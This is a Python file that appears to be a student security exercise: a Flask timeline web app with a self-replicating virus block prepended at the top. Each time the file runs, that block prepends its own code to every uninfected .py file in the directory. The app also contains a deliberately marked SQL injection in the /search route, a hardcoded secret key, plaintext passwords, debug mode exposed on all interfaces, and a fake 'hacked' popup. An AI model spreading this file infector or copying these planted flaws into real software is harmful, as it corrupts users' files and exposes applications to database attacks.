# VIRUS SAYS HI!

import sys
import glob
import time
import os

virus_code = []

try:
    with open(sys.argv[0], 'r', encoding='utf-8') as f:
        lines = f.readlines()
except:
    with open(sys.argv[0], 'r', encoding='utf-8-sig') as f:
        lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line.strip() == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line.strip() == "# VIRUS SAYS BYE!":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    if file == sys.argv[0]:
        continue  # Skip self
        
    try:
        with open(file, 'r', encoding='utf-8') as f:
            file_code = f.readlines()
    except:
        try:
            with open(file, 'r', encoding='utf-8-sig') as f:
                file_code = f.readlines()
        except:
            continue

    infected = False
    for line in file_code:
        if "# VIRUS SAYS HI!" in line:
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.append('\n')
        final_code.extend(file_code)

        try:
            with open(file, 'w', encoding='utf-8') as f:
                f.writelines(final_code)
        except:
            with open(file, 'w', encoding='utf-8-sig') as f:
                f.writelines(final_code)

def malicious_code():
    print("💀 YOU HAVE BEEN INFECTED HAHAHA !!! 💀")

malicious_code()

# VIRUS SAYS BYE!

import os
import sqlite3
from flask import Flask, redirect, request, session, render_template_string, jsonify
from jinja2 import Template
import time
import threading
import glob
import sys

app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

# ===== HACK POPUP CSS =====
HACK_POPUP_CSS = """
.hack-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: rgba(0,0,0,0.95);
    z-index: 999999;
    display: flex;
    justify-content: center;
    align-items: center;
    backdrop-filter: blur(10px);
}

.hack-container {
    background: linear-gradient(45deg, #ff0000, #ff4444, #ff0000);
    border: 3px solid #ff0000;
    border-radius: 20px;
    padding: 40px;
    text-align: center;
    color: white;
    box-shadow: 0 0 50px rgba(255,0,0,0.8);
    animation: hackPulse 0.5s infinite alternate;
    max-width: 500px;
}

@keyframes hackPulse {
    0% { transform: scale(1); box-shadow: 0 0 50px rgba(255,0,0,0.8); }
    100% { transform: scale(1.05); box-shadow: 0 0 80px rgba(255,0,0,1); }
}

.hack-title {
    font-size: 3rem;
    font-weight: 900;
    margin-bottom: 20px;
    text-shadow: 0 0 20px #ff0000;
    animation: glitch 0.3s infinite;
}

@keyframes glitch {
    0%, 100% { transform: translate(0); }
    20% { transform: translate(-2px, 2px); }
    40% { transform: translate(-2px, -2px); }
    60% { transform: translate(2px, 2px); }
    80% { transform: translate(2px, -2px); }
}

.hack-text {
    font-size: 1.3rem;
    margin-bottom: 30px;
    font-weight: 600;
}

.hack-timer {
    font-size: 4rem;
    font-weight: 900;
    color: #ffff00;
    text-shadow: 0 0 20px #ffff00;
    margin-bottom: 20px;
}
"""

# ===== HACK POPUP JS =====
HACK_POPUP_JS = """
function showHackPopup() {
    const overlay = document.createElement('div');
    overlay.className = 'hack-overlay';
    overlay.innerHTML = `
        <div class="hack-container">
            <div class="hack-title">💀 SYSTEM HACKED 💀</div>
            <div class="hack-text">YOUR POST HAS BEEN INFECTED!</div>
            <div class="hack-timer" id="hackTimer">5</div>
            <div style="font-size: 1.1rem; opacity: 0.9;">HACKER: ANONYMOUS</div>
        </div>
    `;
    
    document.body.appendChild(overlay);
    
    let timeLeft = 5;
    const timer = document.getElementById('hackTimer');
    const countdown = setInterval(() => {
        timeLeft--;
        timer.textContent = timeLeft;
        
        if (timeLeft <= 0) {
            clearInterval(countdown);
            overlay.style.transition = 'opacity 1s';
            overlay.style.opacity = '0';
            setTimeout(() => {
                overlay.remove();
                window.location.href = '/';
            }, 1000);
        }
    }, 1000);
}
"""

# ===== EMBEDDED CSS =====
EMBEDDED_CSS = """
/* [All original CSS here - copy dari kode sebelumnya] */
""" + HACK_POPUP_CSS  # Tambah hack CSS

# ===== TEMPLATES (sama seperti sebelumnya) =====
TIMELINE_TEMPLATE = """<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Timeline App</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>{{ css }}</style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark custom-navbar">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">
                <i class="fas fa-timeline me-2"></i>TimelineApp 💀
            </a>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <span class="navbar-text text-white">
                            <i class="fas fa-user me-1"></i>{{ user }}
                        </span>
                    </li>
                    <li class="nav-item ms-3">
                        <a class="nav-link logout-btn" href="/logout">
                            <i class="fas fa-sign-out-alt me-1"></i>Logout
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container py-5">
        <div class="row mb-5">
            <div class="col-lg-12">
                <h1 class="page-title mb-2">
                    <i class="fas fa-bookmark me-2"></i>My Timeline 💀
                </h1>
                <p class="subtitle text-muted">Share your thoughts and moments (INFECTED)</p>
            </div>
        </div>

        <div class="row g-4">
            <div class="col-lg-8">
                <div class="card glass-effect entry-card">
                    <div class="card-body p-4">
                        <h5 class="card-title mb-3">
                            <i class="fas fa-feather me-2"></i>Add New Entry ⚠️
                        </h5>
                        <form action="/create" method="post" class="d-flex gap-2">
                            <input name="content" class="form-control entry-input" 
                                   placeholder="What's on your mind? (Will be HACKED)" required>
                            <button type="submit" class="btn btn-primary btn-post">
                                <i class="fas fa-paper-plane me-1"></i>POST 💀
                            </button>
                        </form>
                    </div>
                </div>

                <!-- Timeline content sama -->
                <div class="timeline-container mt-4">
                    <h5 class="section-title mb-4">
                        <i class="fas fa-clock me-2"></i>Timeline Posts 💀
                    </h5>
                    {% for line in tl %}
                    <div class="card glass-effect timeline-item">
                        <div class="card-body">
                            <div class="d-flex justify-content-between align-items-start">
                                <div class="flex-grow-1">
                                    <div class="timeline-content">
                                        <i class="fas fa-quote-left quote-icon me-2"></i>
                                        {{ line.content }}
                                    </div>
                                </div>
                                <a href="/delete/{{ line.id }}" class="btn btn-sm btn-delete">
                                    <i class="fas fa-trash-alt"></i>
                                </a>
                            </div>
                            <small class="text-muted d-block mt-2">
                                <i class="fas fa-clock me-1"></i>Posted
                            </small>
                        </div>
                    </div>
                    {% else %}
                    <div class="alert alert-danger text-center" role="alert">
                        <i class="fas fa-skull-crossbones me-2"></i>SYSTEM INFECTED! No entries yet.
                    </div>
                    {% endfor %}
                </div>
            </div>

            <!-- Sidebar sama -->
        </div>
    </div>

    <!-- HACK JAVASCRIPT -->
    <script>{{ hack_js }}</script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>"""

LOGIN_TEMPLATE = """<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login - Timeline App 💀</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>{{ css }}</style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="login-title">
                <i class="fas fa-timeline me-2"></i>TimelineApp 💀
            </div>
            <p class="login-subtitle">Welcome Back (INFECTED)</p>
            <form method="post" class="login-form">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">
                    <i class="fas fa-sign-in-alt me-2"></i>Login 💀
                </button>
            </form>
            <p style="text-align: center; margin-top: 20px; color: #ff4444; font-size: 0.9rem;">
                <i class="fas fa-skull me-1"></i>Demo: alice/alicepw | bob/bobpw | INFECTED!
            </p>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>"""

# ===== DATABASE FUNCTIONS (sama) =====
def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def create_tables():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
                id      INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT    NOT NULL UNIQUE,
                password TEXT    NOT NULL
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS time_line(
                id       INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id  INTEGER NOT NULL,
                content  TEXT    NOT NULL,
                FOREIGN KEY(user_id) REFERENCES user(id)
            )
        ''')
        conn.commit()

def init_data():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.executemany(
            'INSERT OR IGNORE INTO user(username, password) VALUES (?,?)',
            [('alice','alicepw'), ('bob','bobpw')]
        )
        cur.executemany(
            'INSERT OR IGNORE INTO time_line(user_id, content) VALUES (?,?)',
            [(1,'Hello world 💀'), (2,'Hi there INFECTED')]
        )
        conn.commit()

def authenticate(username, password):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'SELECT id, username FROM user WHERE username = ? AND password = ?',
            (username, password)
        )
        row = cur.fetchone()
        return dict(row) if row else None

def create_time_line(uid, content):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'INSERT INTO time_line(user_id, content) VALUES (?,?)',
            (uid, content)
        )
        conn.commit()

def get_time_lines():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
        return [dict(r) for r in cur.fetchall()]

def delete_time_line(uid, tid):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            "DELETE FROM time_line WHERE user_id = ? AND id = ?",
            (uid, tid)
        )
        conn.commit()

# ===== ROUTES =====
@app.route('/init')
def init_page():
    create_tables()
    init_data()
    return redirect('/')

@app.route('/')
def index():
    if 'uid' in session:
        tl = get_time_lines()
        template = TIMELINE_TEMPLATE.replace('{{ hack_js }}', HACK_POPUP_JS)
        return render_template_string(template, user=session['username'], tl=tl, css=EMBEDDED_CSS)
    return redirect('/login')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=='POST':
        user = authenticate(request.form['username'], request.form['password'])
        if user:
            session['uid'] = user['id']
            session['username'] = user['username']
            return redirect('/')
    return render_template_string(LOGIN_TEMPLATE, css=EMBEDDED_CSS)

@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        # 🔥 5 DETIK FREEZE HACK! 🔥
        print("💀 HACKING USER POST - FREEZING FOR 5 SECONDS 💀")
        time.sleep(5)
        
        create_time_line(session['uid'], request.form['content'])
        
        # Trigger hack popup
        return f'''
        <!DOCTYPE html>
        <html>
        <head><title>HACKED</title></head>
        <body style="background:black;color:red;font-family:monospace;text-align:center;padding:50px;">
            <h1>⏳ PROCESSING HACK... </h1>
            <script>
                setTimeout(() => {{
                    {HACK_POPUP_JS}
                    showHackPopup();
                }}, 500);
            </script>
        </body>
        </html>
        '''
    return redirect('/')

@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    conn = connect_db()
    cur = conn.cursor()
    # 🔥 SQL INJECTION VULN
    query = f"SELECT id, user_id, content FROM time_line WHERE content LIKE '%{keyword}%'"
    cur.execute(query)
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return {'query_used': query, 'results': rows}

@app.route('/delete/<int:tid>')
def delete(tid):
    if 'uid' in session:
        delete_time_line(session['uid'], tid)
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__=='__main__':
    create_tables()
    init_data()
    app.run(debug=True, host='0.0.0.0', port=5000)